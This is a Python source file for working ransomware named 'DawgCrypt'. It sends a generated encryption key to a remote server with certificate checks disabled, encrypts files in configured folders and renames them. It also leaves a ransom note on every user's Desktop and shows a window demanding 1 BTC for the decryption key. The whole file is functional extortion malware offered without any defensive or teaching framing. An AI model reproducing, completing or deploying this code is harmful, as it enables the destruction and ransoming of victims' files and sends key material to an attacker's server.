import configparser
import os
import pathlib
import tkinter.messagebox
import glob

from cryptography.fernet import Fernet
import urllib.request
import ssl
from time import sleep
import uuid
import tkinter as tk
from tkinter.ttk import *

config=configparser.ConfigParser()
config.read(os.path.dirname(__file__)+'/config.ini')
server=config.get('Configuration','server')
program_name=config.get('Configuration','name')
enc_ext=config.get('Configuration','extension')
wait_time=int(config.get('Configuration','wait_time'))

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def do_encrption():
    succeeded = False
    key = Fernet.generate_key()
    fernet = Fernet(key)
    while succeeded==False:
        try:
            r = urllib.request.urlopen('https://{}/do/{}/{}'.format(server,encryption_uuid,key.decode()),context=ctx)
            all_files=[]
            for each_section in config.sections():
                if str(each_section)!='Configuration':
                    config_dict=dict(config.items(each_section))
                    current_path=config_dict['path']
                    current_extensions=config_dict['extensions'].split(",")
                    current_pathlib = pathlib.Path(current_path)
                    for each_extension in current_extensions:
                        all_files.extend(current_pathlib.rglob("*.{}".format(each_extension)))
            for f in set(all_files):
                with open(f, 'r+b') as file:
                    original=file.read()
                    encrypted=fernet.encrypt(original)
                    file.seek(0)
                    file.write(encrypted)
                    file.truncate()
                os.rename(str(f),str(f)+"."+enc_ext)
            create_help_file()
            succeeded=True
        except(urllib.error.URLError):
            sleep(wait_time)

def undo_with_key():
    key=key_entry.get()
    try:
        fernet=Fernet(key.encode())
        all_files = []
        for each_section in config.sections():
            if str(each_section)!="Configuration":
                config_dict = dict(config.items(each_section))
                current_path = config_dict['path']
                current_pathlib = pathlib.Path(current_path)
                all_files.extend(current_pathlib.rglob("*" +"."+ enc_ext))
        for f in set(all_files):
            with open(f, 'r+b') as file:
                encrypted = file.read()
                decrypted = fernet.decrypt(encrypted)
                file.seek(0)
                file.write(decrypted)
                file.truncate()
            os.rename(str(f), os.path.splitext(str(f))[0])
        tk.messagebox.showinfo("Decryption Complete", "Decryption Complete!")
        window.destroy()
    except ValueError:
        tk.messagebox.showerror("Invalid Key","Invalid Key!")

def request_key():
    try:
        with urllib.request.urlopen('https://{}/request_key/{}'.format(server, encryption_uuid), context=ctx) as r:
            response_key=r.read()
            if(response_key==b''):
                key_entry.delete(0,tk.END)
                key_entry.insert(0,"The key has not yet been authorized")
            else:
                key_entry.delete(0, tk.END)
                key_entry.insert(0,response_key.decode())
    except:
        pass

def create_help_file():
    user_desktops = glob.glob('C:/Users/*/Desktop')
    for d in user_desktops:
        try:
            with open(d+'/DawgCrypt Decryption.txt', 'w') as help_file:
                help_file.write("Run {} for decryption instructions".format(__file__))
        except:
            pass

if __name__ == '__main__':
    if(pathlib.Path(os.path.dirname(__file__)+'/uuid').is_file()):
        try:
            with open('uuid', 'r') as uuid_file:
                encryption_uuid = uuid_file.read()
        except:
            pass
        window = tk.Tk()
        window.title(program_name)
        label = Label(text="Your files have been encrypted. Please pay 1 BTC and then they can be decrypted.")
        label2 = Label(text="After payment, click the button below or enter the provided key in the box.")
        button=Button(text="Request key",command=request_key)
        key_entry=Entry(width=100)
        decrypt_button=Button(text="Decrypt",command=undo_with_key)
        label.pack()
        label2.pack()
        button.pack()
        key_entry.pack()
        decrypt_button.pack()
        window.mainloop()
    else:
        try:
            with open(os.path.dirname(__file__)+'/uuid', 'w') as uuid_file:
                encryption_uuid = uuid.uuid4()
                uuid_file.write(str(encryption_uuid))
            do_encrption()
        except:
            pass